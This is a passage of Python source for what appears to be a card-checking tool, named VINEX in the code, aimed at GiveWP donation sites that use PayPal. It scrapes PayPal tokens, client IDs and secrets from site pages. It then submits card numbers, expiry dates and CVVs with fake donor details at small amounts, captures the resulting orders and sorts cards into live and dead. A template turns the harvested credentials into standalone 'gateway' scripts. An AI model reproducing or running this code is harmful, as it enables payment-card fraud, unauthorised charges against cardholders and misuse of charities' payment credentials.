                for p in [r'client-id=["\']([A-Za-z0-9_-]{20,})["\']',
                          r'"clientId"\s*:\s*"([A-Za-z0-9_-]{20,})"']:
                    m = re.search(p, c, re.I)
                    if m: self.client_id = m.group(1); break
            if not self.paypal:
                for p in [r'merchant-id=["\']([A-Za-z0-9]+)["\']',
                          r'"merchantId"\s*:\s*"([A-Za-z0-9]+)"']:
                    m = re.search(p, c, re.I)
                    if m: self.paypal = m.group(1); break
            self._log(f'candidates: {len(self.token_candidates)}')
            return len(self.token_candidates) > 0
        except Exception as e:
            self._log(f'extract: {e}')
            return False

    def _validate_token(self, token, timeout=6):
        if not token or len(token) < 20: return False
        valid_p = ('A21', 'eyJ', 'Q2l0', 'RW', 'V1')
        if not any(token.startswith(p) for p in valid_p) and len(token) < 100:
            return False
        try:
            r = self.r.head('https://api-m.paypal.com/v2/checkout/orders',
                            headers={'Authorization': f'Bearer {token}'}, timeout=timeout)
            if r.status_code in (200, 201, 400, 405, 422): return True
            if r.status_code == 401: return False
        except Exception:
            return len(token) > 50
        return False

    def _pick_valid_token(self):
        if not self.token_candidates: return False
        def prio(c):
            s = c['source'].lower()
            if 'a21' in s: return 0
            if 'direct' in s: return 1
            if 'jwt' in s: return 2
            if 'dec-chain' in s: return 2
            if 'b64' in s: return 3
            return 4
        for c in sorted(self.token_candidates, key=prio):
            if self._validate_token(c['token']):
                self.au = c['token']; self.token_verified = True
                return True
        return False

    def _try_ajax_client_token(self):
        if not self.ajax_url or not self.id_form2: return False
        for action in ['give_paypal_commerce_get_client_token', 'get_client_token']:
            try:
                r = self._safe_post(self.ajax_url,
                    data={'action': action, 'form-id': self.id_form2,
                          'give-form-hash': self.nonce or '',
                          'give-form-id-prefix': self.id_form1 or f'{self.id_form2}-1'},
                    headers={'user-agent': self.uu.random,
                             'x-requested-with': 'XMLHttpRequest',
                             'referer': self.page_url}, timeout=8)
                if r and r.status_code == 200 and r.text:
                    try:
                        j = r.json(); token = None
                        if isinstance(j.get('data'), str): token = j['data']
                        elif isinstance(j.get('data'), dict):
                            d = j['data']
                            token = d.get('client_token') or d.get('token') or d.get('access_token')
                        if not token:
                            token = j.get('client_token') or j.get('token') or j.get('access_token')
                        if token and len(token) > 20:
                            try:
                                dec = base64.b64decode(token + '=' * (-len(token) % 4)).decode('utf-8', errors='ignore')
                                tm = re.search(r'"accessToken"\s*:\s*"([^"]+)"', dec)
                                if tm:
                                    self._add_candidate(tm.group(1), f'ajax-b64:{action}')
                                    continue
                            except Exception:
                                pass
                            self._add_candidate(token, f'ajax:{action}')
                    except Exception:
                        pass
            except Exception:
                continue
        return len(self.token_candidates) > 0

    def _try_ajax_nonce(self):
        try:
            if not self.ajax_url:
                self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
            if not self.id_form2: return False
            for action in ['give_get_form_nonce', 'give_donation_form_nonce']:
                r = self._safe_post(self.ajax_url,
                    data={'action': action, 'form_id': self.id_form2},
                    headers={'user-agent': self.uu.random,
                             'x-requested-with': 'XMLHttpRequest'}, timeout=6)
                if r and r.status_code == 200 and r.text:
                    try:
                        j = r.json()
                        if 'data' in j and isinstance(j['data'], str) and len(j['data']) >= 6:
                            self.nonce = j['data']; return True
                        if 'nonce' in j: self.nonce = j['nonce']; return True
                    except Exception:
                        pass
        except Exception:
            pass
        return False

    def _detect_gateway_type(self):
        try:
            c = self.all_content
            if 'braintreegateway.com' in c and 'data-client-token' in c:
                self.gateway_type = 'braintree'
            elif 'paypal.com/sdk/js' in c and 'client-id=' in c:
                self.gateway_type = 'paypal_sdk'
            elif 'give_paypal_commerce' in c:
                self.gateway_type = 'givewp_paypal'
            elif 'paypal' in c.lower():
                self.gateway_type = 'paypal_unknown'
            else:
                self.gateway_type = 'unknown'
        except Exception:
            self.gateway_type = 'unknown'

    def _refresh_nonce(self):
        try:
            r = self._safe_get(self.page_url, timeout=15)
            if not r or r.status_code != 200: return False
            h = r.text
            self.page_html = h; self.all_content = h
            m = re.search(r'name="give-form-hash"\s+value="([^"]+)"', h)
            if m: self.nonce = m.group(1)
            m = re.search(r'name="give-form-id"\s+value="(\d+)"', h)
            if m: self.id_form2 = m.group(1)
            m = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', h)
            if m: self.id_form1 = m.group(1)
            return bool(self.nonce)
        except Exception:
            return False

    def _autofill_required_fields(self, form_data):
        try:
            for name, info in self.form_fields.items():
                if name in form_data or not info.get('required'): continue
                if name.startswith(('give-form-', 'give_')): continue
                if name in ('give-amount', 'give_first', 'give_last', 'give_email',
                            'give-gateway', 'payment-mode', 'give-price-id',
                            'give_agree_to_terms', 'give_terms_agreement'):
                    continue
                if 'prefill' in info:
                    form_data[name] = info['prefill']; continue
                ft = info.get('type', '')
                opts = [o for o in info.get('options', []) if is_valid_option(o)]
                nl = name.lower()
                if ft in ('select', 'radio'):
                    if not opts: continue
                    form_data[name] = opts[0]
                elif ft == 'checkbox':
                    form_data[name] = opts[0] if opts else 'on'
                elif ft == 'email':
                    form_data[name] = self.email
                elif ft == 'number':
                    form_data[name] = '1'
                elif ft == 'tel':
                    form_data[name] = '1234567890'
                elif ft == 'date':
                    form_data[name] = '1990-01-01'
                else:
                    if 'first' in nl:
                        form_data[name] = random.choice(FIRST_NAMES)
                    elif 'last' in nl:
                        form_data[name] = random.choice(LAST_NAMES)
                    elif 'name' in nl:
                        form_data[name] = f'{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}'
                    elif 'email' in nl:
                        form_data[name] = self.email
                    elif any(k in nl for k in ('phone', 'mobile', 'tel')):
                        form_data[name] = '1234567890'
                    elif any(k in nl for k in ('address', 'street')):
                        form_data[name] = '123 Main St'
                    elif 'city' in nl:
                        form_data[name] = 'New York'
                    elif any(k in nl for k in ('zip', 'postal')):
                        form_data[name] = '10001'
                    elif 'state' in nl:
                        form_data[name] = 'NY'
                    elif 'country' in nl:
                        form_data[name] = 'US'
                    elif 'nric' in nl or 'fin' in nl:
                        form_data[name] = 'S1234567A'
                    elif 'amount' in nl:
                        form_data[name] = self.donation
                    else:
                        form_data[name] = 'Test'
        except Exception:
            pass
        return form_data

    # ─── Token acquisition / OAuth ───
    def _try_oauth(self):
        if not self.client_id or not self.client_secret: return False
        try:
            r = self.r.post(
                'https://api-m.paypal.com/v1/oauth2/token',
                auth=(self.client_id, self.client_secret),
                data={'grant_type': 'client_credentials'},
                headers={'Accept': 'application/json'},
                timeout=15,
            )
            if r.status_code == 200:
                tok = r.json().get('access_token')
                if tok:
                    self.au = tok
                    self.auth_method = 'oauth'
                    self._log('OAuth token acquired')
                    return True
        except Exception:
            pass
        return False

    def Key(self):
        try:
            if not self.page_url or 'invalid.local' in self.page_url: return False
            self._warmup_session()
            if not self._fetch_page(): return False

            self.cf_detected = self._detect_cloudflare()
            if self.cf_detected:
                if self._solve_cloudflare():
                    self._log('CF solved, refetching')
                    self._fetch_page()

            self._deep_js_analysis()
            self._extract_basic()
            self._extract_all_form_fields()
            self._extract_tokens_ultimate()
            self._extract_from_headers()
            self._try_wp_json()
            self._extract_js_sourcemaps()
            self._probe_sw()
            self._deep_js_analysis()
            self._extract_basic()
            self._extract_tokens_ultimate()

            if self.token_candidates and self._pick_valid_token():
                self.auth_method = 'token'

            if not self.au:
                self._load_iframes()
                self._deep_js_analysis()
                self._extract_basic()
                self._extract_tokens_ultimate()
                if self.token_candidates and self._pick_valid_token():
                    self.auth_method = 'token'

            if not self.au:
                self._load_all_js()
                self._deep_js_analysis()
                self._extract_tokens_ultimate()
                if self.token_candidates and self._pick_valid_token():
                    self.auth_method = 'token'

            if not self.au:
                if self._try_ajax_client_token() and self._pick_valid_token():
                    self.auth_method = 'ajax'

            if not self.au and self.client_id and self.client_secret:
                if self._try_oauth():
                    pass

            if not self.nonce and self.id_form2: self._try_ajax_nonce()
            self._resolve_dropdown_options()
            self._resolve_special_fields()

            if not self.id_form1 and self.id_form2:
                self.id_form1 = f'{self.id_form2}-1'
            if not self.ajax_url:
                self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'

            self._detect_gateway_type()
            return True
        except Exception as e:
            self._log(f'key: {e}')
            return False

    def _build_amounts(self):
        amounts = list(BASE_AMOUNTS)
        try:
            min_val = float(self.minimum)
            if min_val > 5.00 and min_val <= 500:
                m = f'{min_val:.2f}'
                if m not in amounts:
                    amounts.append(m)
        except Exception:
            pass
        return amounts

    # ─── Tier A/B/C/D: GiveWP-side create_order ───
    def _create_order_givewp(self, amt, pid):
        try:
            fd = {
                'give-form-id-prefix': self.id_form1 or '',
                'give-form-id': self.id_form2 or '',
                'give-form-hash': self.nonce or '',
                'give-amount': amt,
                'give-currency': self.currency,
                'payment-mode': 'paypal-commerce',
                'give_first': random.choice(FIRST_NAMES),
                'give_last': random.choice(LAST_NAMES),
                'give_email': self.email,
                'give-gateway': 'paypal-commerce',
                'give_agree_to_terms': 'on',
                'give_terms_agreement': 'on',
            }
            if pid is not None:
                fd['give-price-id'] = pid
            fd = self._autofill_required_fields(fd)
            da = MultipartEncoder({k: (None, str(v) if v is not None else '') for k, v in fd.items()})
            he = {
                'content-type': da.content_type,
                'user-agent': self.uu.random,
                'x-requested-with': 'XMLHttpRequest',
                'referer': self.page_url,
                'origin': f'https://{self.url}',
                'accept': 'application/json, text/plain, */*',
            }
            r3 = None; net_err = None
            for retry in range(2):
                try:
                    r3 = self.r.post(self.ajax_url,
                        params={'action': 'give_paypal_commerce_create_order'},
                        headers=he, data=da, timeout=25)
                    break
                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
                    net_err = str(e)[:100]; time.sleep(1 + retry); continue
                except Exception as e:
                    net_err = str(e)[:100]; break
            if r3 is None: return None, f'NETWORK: {net_err}'
            body = r3.text or ''
            if r3.status_code != 200:
                if r3.status_code in (401, 403):
                    return None, f'AUTH_REQUIRED: HTTP_{r3.status_code}'
                if r3.status_code == 429:
                    return None, 'RATE_LIMITED'
                return None, f'HTTP_{r3.status_code}: {body[:120]}'
            try:
                j = r3.json()
            except Exception:
                if 'nonce' in body.lower():
                    return None, 'NONCE_MISSING'
                return None, f'JSON_ERR: {body[:120]}'
            if isinstance(j, dict) and j.get('success') \
               and isinstance(j.get('data'), dict) and j['data'].get('id'):
                return j['data']['id'], None
            real = extract_response_text(body)
            return None, real or 'ORDER_CREATE_FAILED'
        except Exception as e:
            return None, f'EXC_{type(e).__name__}: {str(e)[:100]}'

    # ─── Tier E: Direct PayPal API ───
    def _create_order_paypal_api(self, amt):
        if not self.au: return None, 'NO_TOKEN'
        try:
            headers = {
                'Authorization': f'Bearer {self.au}',
                'Content-Type': 'application/json',
                'PayPal-Request-Id': hashlib.md5(f'{time.time()}{random.random()}'.encode()).hexdigest(),
                'Prefer': 'return=representation',
                'Origin': f'https://{self.url}',
                'Referer': f'https://{self.url}/',
                'User-Agent': self.uu.random,
            }
            body = {
                'intent': 'CAPTURE',
                'purchase_units': [{
                    'amount': {'currency_code': self.currency, 'value': amt},
                    'description': 'Donation',
                }],
                'application_context': {
                    'shipping_preference': 'NO_SHIPPING',
                    'user_action': 'PAY_NOW',
                    'return_url': f'https://{self.url}/',
                    'cancel_url': f'https://{self.url}/',
                },
            }
            r = self.r.post('https://api-m.paypal.com/v2/checkout/orders',
                            headers=headers, json=body, timeout=20)
            if r.status_code in (200, 201):
                j = r.json()
                if j.get('id'):
                    return j['id'], None
            return None, f'PP_API_{r.status_code}: {(r.text or "")[:150]}'
        except Exception as e:
            return None, f'PP_API_EXC_{type(e).__name__}'

    # ─── Tier G: Extract order_id from HTML ───
    def _try_extract_existing_order(self):
        try:
            for pat in [r'data-order-id=["\']([A-Z0-9]{10,})["\']',
                        r'"orderID"\s*:\s*"([A-Z0-9]{10,})"',
                        r'"order_id"\s*:\s*"([A-Z0-9]{10,})"',
                        r'window\.__order\s*=\s*["\']([A-Z0-9]{10,})["\']']:
                m = re.search(pat, self.all_content, re.I)
                if m: return m.group(1)
        except Exception:
            pass
        return None

    # ─── Confirm payment source ───
    def _confirm_payment_source(self, order_id, card_num, mm, yy, cvc):
        if not self.au: return None, 'NO_TOKEN'
        try:
            expiry = f'20{yy}-{mm}'
            headers = {
                'Authorization': f'Bearer {self.au}',
                'PayPal-Client-Metadata-Id': self.paypal or self.client_id or '',
                'Content-Type': 'application/json',
                'Origin': f'https://{self.url}',
                'Referer': f'https://{self.url}/',
                'User-Agent': self.uu.random,
            }
            body = {
                'payment_source': {'card': {
                    'number': card_num,
                    'expiry': expiry,
                    'security_code': cvc,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                }},
                'application_context': {'vault': False},
            }
            r = self.r.post(
                f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                headers=headers, json=body, timeout=25)
            return r.text or '', r.status_code
        except Exception as e:
            return '', f'EXC_{type(e).__name__}'

    # ─── Read final state (KEY FEATURE) ───
    def _read_final_state(self, order_id):
        if not self.au or not order_id: return None
        try:
            headers = {
                'Authorization': f'Bearer {self.au}',
                'Content-Type': 'application/json',
                'Origin': f'https://{self.url}',
                'Referer': f'https://{self.url}/',
                'User-Agent': self.uu.random,
            }
            r = self.r.get(f'https://api-m.paypal.com/v2/checkout/orders/{order_id}',
                           headers=headers, timeout=15)
            if r.status_code != 200:
                return {'status': 'READ_FAILED', 'http': r.status_code,
                        'body': (r.text or '')[:300]}
            j = r.json()
            result = {
                'status': j.get('status'),
                'intent': j.get('intent'),
                'id': j.get('id'),
                'links': {l.get('rel'): l.get('href') for l in (j.get('links') or [])},
                'captures': [],
                'authorizations': [],
                'payer': j.get('payer'),
                'payment_source': j.get('payment_source'),
                'purchase_units': [],
            }
            for pu in (j.get('purchase_units') or []):
                pu_info = {'reference_id': pu.get('reference_id'),
                           'amount': pu.get('amount'),
                           'payments': pu.get('payments')}
                result['purchase_units'].append(pu_info)
                pays = pu.get('payments') or {}
                for cap in (pays.get('captures') or []):
                    result['captures'].append(cap)
                for auth in (pays.get('authorizations') or []):
                    result['authorizations'].append(auth)
            return result
        except Exception as e:
            return {'status': 'READ_EXC', 'error': str(e)[:200]}

    def _capture_order(self, order_id):
        if not self.au or not order_id: return None
        try:
            headers = {
                'Authorization': f'Bearer {self.au}',
                'Content-Type': 'application/json',
                'PayPal-Request-Id': hashlib.md5(f'{order_id}{time.time()}'.encode()).hexdigest(),
                'Prefer': 'return=representation',
                'Origin': f'https://{self.url}',
                'Referer': f'https://{self.url}/',
                'User-Agent': self.uu.random,
            }
            r = self.r.post(f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/capture',
                            headers=headers, json={}, timeout=20)
            if r.status_code in (200, 201):
                try: return r.json()
                except Exception: return {'raw': r.text[:300]}
            return {'error': r.status_code, 'body': (r.text or '')[:300]}
        except Exception as e:
            return {'error': type(e).__name__, 'body': str(e)[:200]}

    # ─── GiveWP approve ───
    def _approve_order_givewp(self, order_id, amt, pid):
        try:
            fd = {
                'give-form-id-prefix': self.id_form1 or '',
                'give-form-id': self.id_form2 or '',
                'give-form-hash': self.nonce or '',
                'give-amount': amt,
                'give-currency': self.currency,
                'payment-mode': 'paypal-commerce',
                'give_first': random.choice(FIRST_NAMES),
                'give_last': random.choice(LAST_NAMES),
                'give_email': self.email,
                'give-gateway': 'paypal-commerce',
                'give_agree_to_terms': 'on',
                'give_terms_agreement': 'on',
            }
            if pid is not None:
                fd['give-price-id'] = pid
            fd = self._autofill_required_fields(fd)
            da = MultipartEncoder({k: (None, str(v) if v is not None else '') for k, v in fd.items()})
            he = {
                'content-type': da.content_type,
                'user-agent': self.uu.random,
                'x-requested-with': 'XMLHttpRequest',
                'referer': self.page_url,
                'origin': f'https://{self.url}',
            }
            r = self.r.post(self.ajax_url,
                params={'action': 'give_paypal_commerce_approve_order', 'order': order_id},
                headers=he, data=da, timeout=25)
            return r.text or '', r.status_code
        except Exception as e:
            return '', f'EXC_{type(e).__name__}'

    # ─── One attempt across tiers ───
    def _attempt_charge(self, n, mm, yy, cvc, amt, pid="custom"):
        try:
            self.donation = amt
            order_id = None
            create_err = None
            tier = None

            # Tier A/B: GiveWP create
            order_id, create_err = self._create_order_givewp(amt, pid)
            if order_id:
                tier = 'A'
            else:
                if create_err and is_auth_failure(create_err):
                    self.attempt_log.append(f'GiveWP create auth fail: {create_err[:60]}')
                # Tier E: Direct PayPal API
                order_id, create_err = self._create_order_paypal_api(amt)
                if order_id:
                    tier = 'E'

            # Tier G: pre-existing order
            if not order_id:
                existing = self._try_extract_existing_order()
                if existing:
                    order_id = existing
                    tier = 'G'

            if not order_id:
                return None, create_err or 'ORDER_CREATE_FAILED'

            self.last_order_id = order_id
            self.tier_used = tier

            # confirm-payment-source
            confirm_text, confirm_status = self._confirm_payment_source(order_id, n, mm, yy, cvc)
            if isinstance(confirm_status, int) and confirm_text:
                if is_card_decline(confirm_text):
                    # try final state read anyway for confirmation
                    final = self._read_final_state(order_id)
                    if final and final.get('status') in ('APPROVED', 'COMPLETED'):
                        self.last_order_status = final.get('status')
                        cap = self._maybe_capture(order_id, final)
                        return self._format_final(final, cap), confirm_text

            # GiveWP approve
            approve_text, approve_status = self._approve_order_givewp(order_id, amt, pid)

            # Read final state from PayPal (KEY)
            final = self._read_final_state(order_id)
            cap = None
            if final and final.get('status') == 'APPROVED' and final.get('intent') == 'CAPTURE':
                cap = self._capture_order(order_id)
                final2 = self._read_final_state(order_id)
                if final2 and final2.get('status') == 'COMPLETED':
                    final = final2

            self.last_order_status = (final or {}).get('status')

            combined = (confirm_text or '') + '\n' + (approve_text or '')

            # Format result
            final_str = self._format_final(final, cap)
            if final_str:
                return final_str, combined

            # Fallbacks
            if combined.strip():
                if is_card_decline(combined):
                    return (extract_response_text(combined) or combined[:200]), combined
                if is_auth_failure(combined):
                    return 'AUTH_FAILURE', combined
                raw = extract_response_text(combined)
                if raw and raw.strip():
                    return raw, combined
                return 'UNKNOWN_RESPONSE', combined

            return 'NO_RESPONSE', ''
        except Exception as e:
            return None, f'FATAL_{type(e).__name__}: {str(e)[:120]}'

    def _maybe_capture(self, order_id, final):
        try:
            if final and final.get('status') == 'APPROVED' and final.get('intent') == 'CAPTURE':
                return self._capture_order(order_id)
        except Exception:
            pass
        return None

    def _format_final(self, final, capture_result):
        if not final: return None
        try:
            status = final.get('status')
            if status == 'COMPLETED':
                cap_id = None
                amt_val = None
                currency_val = None
                if capture_result and isinstance(capture_result, dict):
                    pu = (capture_result.get('purchase_units') or [{}])[0]
                    pays = pu.get('payments') or {}
                    caps = pays.get('captures') or []
                    if caps:
                        cap_id = caps[0].get('id')
                        amt_val = (caps[0].get('amount') or {}).get('value')
                        currency_val = (caps[0].get('amount') or {}).get('currency_code')
                if not cap_id:
                    for cap in (final.get('captures') or []):
                        if cap.get('status') == 'COMPLETED':
                            cap_id = cap.get('id')
                            amt_val = (cap.get('amount') or {}).get('value')
                            currency_val = (cap.get('amount') or {}).get('currency_code')
                            break
                self.last_capture_id = cap_id
                return f'CHARGE {amt_val or self.donation} {currency_val or self.currency} [CAPTURED: {cap_id or "N/A"}]'
            if status == 'APPROVED':
                return f'APPROVED order {final.get("id")} (not captured)'
            if status == 'PAYER_ACTION_REQUIRED':
                links = final.get('links') or {}
                pa = links.get('payer-action') or links.get('approve') or ''
                return f'PAYER_ACTION_REQUIRED: {pa[:200]}'
            if status == 'VOIDED':
                return f'VOIDED order {final.get("id")}'
            if status in ('READ_FAILED', 'READ_EXC'):
                return None
            if status:
                return f'ORDER_{status}'
        except Exception:
            pass
        return None

    def Charge(self, ccx, thorough=False):
        try:
            if not ccx or not isinstance(ccx, str): return 'INVALID_CARD_FORMAT'
            parts = re.split(r'[|:/]', ccx.strip().replace(' ', ''))
            if len(parts) < 4: return 'INVALID_CARD_FORMAT'
            n = re.sub(r'\D', '', parts[0])
            mm = re.sub(r'\D', '', parts[1]).zfill(2)
            yy = re.sub(r'\D', '', parts[2])
            cvc = re.sub(r'\D', '', parts[3])
            if len(yy) == 4 and yy.startswith('20'): yy = yy[2:]
            yy = yy.zfill(2)
            if len(n) < 13 or len(n) > 19: return 'INVALID_CARD_NUMBER'
            if len(mm) != 2 or not (1 <= int(mm) <= 12): return 'INVALID_EXPIRY_MONTH'
            if len(cvc) < 3 or len(cvc) > 4: return 'INVALID_CVV'
            if not self.ajax_url or 'invalid.local' in self.ajax_url: return 'INVALID_SITE'
            if not self.id_form2 and not self.au: return 'FORM_ERROR: give-form-id missing'
            if not self.nonce:
                self._try_ajax_nonce()
                if not self.nonce: self._refresh_nonce()
                if not self.nonce and not self.au: return 'NONCE_MISSING'
            if not self.id_form1 and self.id_form2: self.id_form1 = f'{self.id_form2}-1'
            if not self.au:
                self._extract_tokens_ultimate()
                if not self._pick_valid_token():
                    if self._try_ajax_client_token(): self._pick_valid_token()
            if not self.au and self.client_id and self.client_secret:
                self._try_oauth()

            pairs = []
            if self.price_levels:
                for pid, amt in sorted(self.price_levels, key=lambda x: x[1]):
                    pairs.append((pid, f'{amt:.2f}'))
            base_amts = set(a for _, a in pairs)
            for amt in BASE_AMOUNTS:
                if amt not in base_amts:
                    pairs.append(('custom', amt))
            pairs = sorted(pairs, key=lambda x: float(x[1]))

            all_results = []
            create_errors = []
            auth_retry_done = False

            for pid, amt in pairs:
                try:
                    result, text = self._attempt_charge(n, mm, yy, cvc, amt, pid=pid)
                    if result and result.startswith('AUTH_FAILURE'):
                        if not auth_retry_done:
                            auth_retry_done = True
                            self.token_candidates = []
                            self.au = None
                            self._refresh_nonce()
                            self._extract_tokens_ultimate()
                            if self._pick_valid_token():
                                result, text = self._attempt_charge(n, mm, yy, cvc, amt, pid=pid)
                                if result and not result.startswith('AUTH_FAILURE'):
                                    all_results.append({'amount': amt, 'result': result,
                                                        'text': text, 'pid': pid})
                                    continue
                        create_errors.append((amt, 'AUTH_REFRESH'))
                    elif result:
                        all_results.append({'amount': amt, 'result': result,
                                            'text': text, 'pid': pid})
                    else:
                        create_errors.append((amt, text or 'unknown'))
                except Exception as e:
                    create_errors.append((amt, f'EXC_{type(e).__name__}'))

            if not all_results:
                if create_errors:
                    last_amt, last_err = create_errors[-1]
                    self.donation = last_amt
                    return last_err if last_err else 'ORDER_CREATE_FAILED'
                return 'NO_ATTEMPT'

            best = max(all_results, key=lambda x: score_result(x['result']))
            self.donation = best['amount']
            return normalize_result(best['result'])
        except Exception as e:
            return f'FATAL_{type(e).__name__}: {str(e)[:100]}'
            # ═══════════════════════════════════════════════════════════════
#  BRIDGE
# ═══════════════════════════════════════════════════════════════
def check_single_link(link, thorough=True):
    try:
        link = safe_url(link)
        if not link:
            return {'link': str(link)[:100] if link else 'Invalid',
                    'live': False, 'respons': 'BAD_URL',
                    'amount': '1.00', 'tester': None,
                    'tier': None, 'order_status': None, 'capture_id': None}
        tester = VinexTester(link)
        if not tester.Key():
            return {'link': link[:100], 'live': False, 'respons': 'FETCH_FAILED',
                    'amount': '1.00', 'tester': tester,
                    'tier': None, 'order_status': None, 'capture_id': None}
        result = tester.Charge(TEST_CARD, thorough=thorough)
        live = is_live_response(result) and not is_dead_response(result)
        return {'link': link[:100], 'live': live, 'respons': str(result)[:300],
                'amount': tester.donation, 'minimum': tester.minimum,
                'currency': tester.currency, 'auth': tester.auth_method,
                'tester': tester,
                'tier': tester.tier_used,
                'order_status': tester.last_order_status,
                'capture_id': tester.last_capture_id,
                'order_id': tester.last_order_id,
                'prices': len(tester.price_levels),
                'tokens': len(tester.token_candidates)}
    except Exception:
        return {'link': str(link)[:100] if link else 'Invalid',
                'live': False, 'respons': 'FATAL',
                'amount': '1.00', 'tester': None,
                'tier': None, 'order_status': None, 'capture_id': None}

# ═══════════════════════════════════════════════════════════════
#  GATEWAY TEMPLATE v23.0
# ═══════════════════════════════════════════════════════════════
GATEWAY_TEMPLATE_STR = r'''#!/usr/bin/env python3
# VINEX Gateway v23.0 — Multi-Tier + Final-State Read
import requests, random, time, re, base64, json, os, sys, hashlib
try:
    from fake_useragent import UserAgent
    _UU = UserAgent(fallback='Mozilla/5.0')
    def rand_ua():
        try: return _UU.random
        except: return 'Mozilla/5.0'
except Exception:
    def rand_ua(): return 'Mozilla/5.0'
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAGE_URL="$page_url"; AJAX_URL="$ajax_url"; ID_FORM1="$id_form1"; ID_FORM2="$id_form2"
NONCE="$nonce"; ACCESS_TOKEN="$access_token"; PAYPAL_META="$paypal_meta"; CLIENT_ID="$client_id"
CLIENT_SECRET="$client_secret"; CURRENCY="$currency"; MINIMUM="$minimum"; CURRENT_PID="$current_pid"
PRICE_LEVELS=$price_levels_json; FORM_FIELDS=$form_fields_json
HOST=PAGE_URL.split('//')[-1].split('/')[0]
FIRST_NAMES=['James','John','Robert','Michael','William','David']
LAST_NAMES=['Smith','Johnson','Williams','Brown','Jones','Miller']
BASE_AMOUNTS=['1.00','3.00','5.00']

def extract_response_text(b):
    if not b: return ''
    s = str(b).strip()
    if not s: return ''
    try:
        j = json.loads(s)
        if isinstance(j, dict):
            d = j.get('data')
            if isinstance(d, dict):
                det = d.get('details')
                if isinstance(det, list) and det:
                    for x in det:
                        if isinstance(x, dict):
                            for k in ('description','issue','reason'):
                                v = x.get(k)
                                if v and str(v).strip().lower() not in ('none','null',''): return str(v)[:300]
                for k in ('error','message','msg','reason','detail','description','name'):
                    v = d.get(k)
                    if v and str(v).strip().lower() not in ('none','null','false',''): return str(v)[:300]
            elif isinstance(d, str) and d.strip(): return d[:300]
            for k in ('error','message','msg','detail','reason','description'):
                v = j.get(k)
                if v and str(v).strip().lower() not in ('none','null','','false'): return str(v)[:300]
    except Exception: pass
    return s[:300]

_JUNK=['give-','screen-reader','give-label','give-required','give-where']
_JUNK_E={'true','false','none','null','selected','disabled','required'}
def is_valid_option(o):
    if not o or not isinstance(o, str): return False
    x = o.strip()
    if not x: return False
    l = x.lower()
    if l in _JUNK_E: return False
    for p in _JUNK:
        if p in l: return False
    if len(x) > 60 or x.startswith(('{','[','<')): return False
    return True

CARD_DECLINES=['INSTRUMENT_DECLINED','PAYER_CANNOT_PAY','ORDER_NOT_APPROVED','Payer has not yet approved','Payer cannot pay','PAYMENT_DENIED','DO_NOT_HONOR','INSUFFICIENT_FUNDS','CVV_FAILURE','CVV2_FAILURE','INVALID_OR_RESTRICTED','SUSPECTED_FRAUD','ACCOUNT_CLOSED','EXPIRED_CARD','CARD_EXPIRED','TRANSACTION_NOT_PERMITTED','GENERIC_DECLINE','TRANSACTION_REFUSED','AUTHORIZATION_DENIED','DECLINED']
def is_card_decline(t):
    if not t: return False
    up = str(t).upper()
    return any(p.upper() in up for p in CARD_DECLINES)

def luhn_check(cn):
    try:
        d = [int(x) for x in str(cn)]; o = d[-1::-2]; e = d[-2::-2]
        t = sum(o)
        for x in e: t += sum([int(y) for y in str(x*2)])
        return t % 10 == 0
    except Exception: return False

class PayPal:
    def __init__(self):
        self.email = "%s%s%d@gmail.com" % (random.choice(FIRST_NAMES), random.choice(LAST_NAMES), random.randint(100,999))
        self.r = requests.Session(); self.r.headers.update({'user-agent':rand_ua()})
        self.donation = "1.00"
        self.last_order_id = None
        self.last_order_status = None
        self.last_capture_id = None
        self.tier_used = None
        try:
            self.r.get('https://%s/' % HOST, timeout=15); time.sleep(0.2); self.r.get(PAGE_URL, timeout=20)
        except Exception: pass

    def _autofill(self, fd):
        for name, info in FORM_FIELDS.items():
            if name in fd or not info.get("required") or name.startswith(("give-form-","give_")): continue
            if "prefill" in info: fd[name] = info["prefill"]; continue
            ft = info.get("type","")
            opts = [o for o in info.get("options",[]) if is_valid_option(o)]
            if ft in ("select","radio"):
                if not opts: continue
                fd[name] = opts[0]
            elif ft == "email": fd[name] = self.email
            else: fd[name] = "1234567890" if ft == "tel" else "Test"
        return fd

    def _create_givewp(self, amt, pid):
        try:
            fd = {"give-form-id-prefix":ID_FORM1,"give-form-id":ID_FORM2,"give-form-hash":NONCE,"give-amount":amt,"give-currency":CURRENCY,"payment-mode":"paypal-commerce","give_first":random.choice(FIRST_NAMES),"give_last":random.choice(LAST_NAMES),"give_email":self.email,"give-gateway":"paypal-commerce","give_agree_to_terms":"on"}
            if pid is not None: fd["give-price-id"] = pid
            fd = self._autofill(fd)
            da = MultipartEncoder({k:(None,str(v)) for k,v in fd.items()})
            r = self.r.post(AJAX_URL, params={"action":"give_paypal_commerce_create_order"}, headers={"content-type":da.content_type,"x-requested-with":"XMLHttpRequest","referer":PAGE_URL,"origin":"https://"+HOST}, data=da, timeout=20)
            body = r.text or ''
            try: j = r.json()
            except Exception: return None, "JSON_ERR: "+body[:200]
            if isinstance(j, dict) and j.get("success") and isinstance(j.get("data"), dict) and j["data"].get("id"): return j["data"]["id"], None
            return None, extract_response_text(body) or "CREATE_FAILED"
        except Exception as e: return None, "EXC_%s" % type(e).__name__

    def _create_pp_api(self, amt):
        if not ACCESS_TOKEN: return None, "NO_TOKEN"
        try:
            headers = {
                'Authorization': 'Bearer ' + ACCESS_TOKEN,
                'Content-Type': 'application/json',
                'PayPal-Request-Id': hashlib.md5(('%s%s' % (time.time(), random.random())).encode()).hexdigest(),
                'Prefer': 'return=representation',
                'Origin': 'https://' + HOST,
                'Referer': PAGE_URL,
            }
            body = {
                'intent': 'CAPTURE',
                'purchase_units': [{
                    'amount': {'currency_code': CURRENCY, 'value': amt},
                    'description': 'Donation',
                }],
                'application_context': {'shipping_preference': 'NO_SHIPPING', 'user_action': 'PAY_NOW'},
            }
            r = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=body, timeout=20)
            if r.status_code in (200, 201):
                j = r.json()
                if j.get('id'): return j['id'], None
